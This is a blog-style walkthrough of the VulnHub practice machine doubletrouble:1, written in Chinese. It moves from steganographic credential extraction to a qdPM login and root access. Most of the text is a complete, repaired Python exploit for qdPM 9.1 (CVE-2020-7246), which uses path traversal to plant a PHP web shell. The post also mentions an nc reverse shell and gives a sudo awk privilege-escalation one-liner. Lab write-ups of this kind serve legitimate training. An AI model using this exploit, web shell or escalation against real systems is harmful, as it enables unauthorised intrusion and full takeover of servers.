---
title: VulnHub doubletrouble：1
date: 2026-06-09 18:33:00
categories: 
  - VulnHub
tags:
  - 
---

# Dripping doubletrouble：1

项目地址：https://download.vulnhub.com/doubletrouble/doubletrouble.ova

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 NMap 扫描出开放服务及系统版本

![](https://pic1.imgdb.cn/item/6a291f9eeae595505fc16798.png)

访问 80 端口需要登录

![](https://pic1.imgdb.cn/item/6a2920f1eae595505fc1680f.png)

## CTF

### Stegseek 隐写

扫描后台发现 `/secrt` 目录

![](https://pic1.imgdb.cn/item/6a2921adeae595505fc16862.png)

访问得到一张图片

![](https://pic1.imgdb.cn/item/6a292205eae595505fc16889.png)

使用 Stegseek 提取出隐藏文件，在其中找到了用户名密码

```
otisrush@localhost.com
otis666
```

## 弱口令

### qdPM Login

登录成功

![](https://pic1.imgdb.cn/item/6a29229aeae595505fc168c7.png)

## RCE

### qdPM 9.1（CVE-2020-7246）

去找一些历史漏洞，有 RCE 的 NDay

![](https://pic1.imgdb.cn/item/6a2925c4eae595505fc16bf6.png)

查看 exp 源码，我们需要设置一些参数

![](https://pic1.imgdb.cn/item/6a292626eae595505fc16c21.png)

测试的时候发现源码有语法错误，这里修复完善了一下

```python
#!/usr/bin/python3
# Exploit Title: qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)
# Date: 2021-08-03
# Original Exploit Author: Rishal Dwivedi (Loginsoft)
# ExploitDB ID: 47954 / 50175
# CVE: CVE-2020-7246

import sys
import requests
from lxml import html
from argparse import ArgumentParser

# 禁用 InsecureRequestWarning 警告（可选，让输出更干净）
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session_requests = requests.session()

def multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, uservar):
    request_1 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, uservar),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[remove_photo]': (None, '1'),
    }
    return request_1

def req(userid, username, csrftoken_, EMAIL, HOSTNAME):
    # 第一次请求：利用路径穿越删除/覆盖 .htaccess
    request_1 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, '.htaccess')
    session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_1)
    
    # 第二次请求：路径穿越 ../.htaccess
    request_2 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, '../.htaccess')
    session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_2)
    
    # 第三次请求：上传 PHP WebShell
    # 【修复点】：使用三引号 """ 包裹 PHP 代码，彻底解决单双引号嵌套和换行导致的语法错误
    php_payload = """<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>"""
    
    request_3 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, ''),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[photo]': ('backdoor.php', php_payload, 'application/octet-stream'),
    }
    session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_3)

def main(HOSTNAME, EMAIL, PASSWORD):
    # 确保 URL 以 / 结尾
    if not HOSTNAME.endswith('/'):
        HOSTNAME += '/'

    print(f"[*] Attempting to login to {HOSTNAME}...")
    url = HOSTNAME + 'index.php/login'
    result = session_requests.get(url, verify=False)
    
    login_tree = html.fromstring(result.text)
    authenticity_token = list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value")))[0]
    
    payload = {
        'login[email]': EMAIL, 
        'login[password]': PASSWORD, 
        'login[_csrf_token]': authenticity_token
    }
    session_requests.post(url, data=payload, headers=dict(referer=url), verify=False)
    
    print("[*] Fetching account details...")
    account_page = session_requests.get(HOSTNAME + 'index.php/myAccount', verify=False)
    account_tree = html.fromstring(account_page.content)
    
    userid = account_tree.xpath("//input[@name='users[id]']/@value")
    username = account_tree.xpath("//input[@name='users[name]']/@value")
    csrftoken_ = account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
    
    if not userid:
        print("[-] Login failed or unable to access My Account page. Check credentials.")
        sys.exit(1)

    print("[*] Bypassing .htaccess and uploading backdoor...")
    req(userid, username, csrftoken_, EMAIL, HOSTNAME)
    
    get_file = session_requests.get(HOSTNAME + 'index.php/myAccount', verify=False)
    final_tree = html.fromstring(get_file.content)
    backdoor = final_tree.xpath("//input[@name='users[photo_preview]']/@value")
    
    if backdoor:
        shell_url = HOSTNAME + 'uploads/users/' + backdoor[-1] + '?cmd=whoami'
        print(f"\n[+] Success! Backdoor uploaded at:")
        print(f"    {shell_url}")
        print(f"\n[*] Test it in your browser or use curl:")
        print(f"    curl '{HOSTNAME}uploads/users/{backdoor[-1]}?cmd=id'")
    else:
        print("[-] Exploit seems to have failed. Could not find uploaded backdoor path.")

if __name__ == '__main__':
    print("=== qdPM 9.1 Path Traversal + RCE Exploit (CVE-2020-7246) ===")
    print("[!] Note: You cannot use the designated admin account (admin@localhost.com)")
    print("    because they do not have a myAccount page.\n")
    
    parser = ArgumentParser(description='qdPM - Path traversal + RCE Exploit')
    parser.add_argument('-url', '--host', dest='hostname', help='Project URL (e.g., http://192.168.1.10/)', required=True)
    parser.add_argument('-u', '--email', dest='email', help='User email (Any privilege account)', required=True)
    parser.add_argument('-p', '--password', dest='password', help='User password', required=True)
    args = parser.parse_args()

    main(args.hostname, args.email, args.password)
```

![](https://pic1.imgdb.cn/item/6a2927ebeae595505fc1a34b.png)

在之前的目录扫描中有扫出 `/uploads` 这个目录，访问里面有我们写入的后门

![](https://pic1.imgdb.cn/item/6a29286aeae595505fc1a36f.png)

测试没问题

![](https://pic1.imgdb.cn/item/6a292897eae595505fc1a3b0.png)

使用 `nc` 反弹 Shell

![](https://pic1.imgdb.cn/item/6a292905eae595505fc1a40b.png)

## 提权

### Python 升级为交互式 Shell

![](https://pic1.imgdb.cn/item/6a292940eae595505fc1a421.png)

### /etc/sudoers 配置不当

检查自身权限发现可以使用 `awk` 命令

![](https://pic1.imgdb.cn/item/6a29298deae595505fc1a43d.png)

运行 `sudo awk 'BEGIN {system("/bin/sh")}'` 提权成功

- `BEGIN` 块中的代码会在 `awk` 读取任何输入文件之前立即执行

![](https://pic1.imgdb.cn/item/6a2929dceae595505fc1a457.png)